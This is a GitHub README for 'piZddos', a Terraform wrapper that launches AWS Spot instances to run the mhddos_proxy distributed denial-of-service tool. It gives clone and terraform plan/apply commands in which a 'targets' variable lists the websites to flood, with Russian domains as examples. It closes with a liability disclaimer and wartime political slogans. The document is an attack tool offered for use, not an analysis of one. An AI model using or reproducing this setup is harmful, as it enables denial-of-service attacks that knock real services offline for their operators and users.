# piZddos

piZddos is a terraform wrapper for https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git that makes use of AWS Spot instances.


## Installation

Simply clone this repo for installation

```bash
git clone https://github.com/icyspicyyy/piZddos.git
```

## Usage

- et up  [AWS CLI ](https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html) and [terraform](https://learn.hashicorp.com/tutorials/terraform/install-cli).
- Generate SSH key and copy it's content:
```bash
  ssh-keygen
  cat ~\.ssh\id_rsa.pub
```
- put params to `variables.tf` file or run from cli
```bash
terraform plan -var "price=0.0019" -var "ssh_key=YOUR_KEY_CONTENT" -var "instance_count=3" -var "ami=ami-0d527b8c289b4af7f"  -var "region=eu-central-1" -var "targets=https://site.ru https://site2.ru"
terraform apply -var "price=0.0019" -var "ssh_key=YOUR_KEY_CONTENT" -var "instance_count=3" -var "ami=ami-0d527b8c289b4af7f"  -var "region=eu-central-1" -var "targets=https://site.ru https://site2.ru"

```

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Warning!
You are using provided scripts at your own risk. Author does not bear any responsibility in case of misuse.

Slava Ukraine! Glory to Ukraine!
Русский военный корабль, иди нахуй!
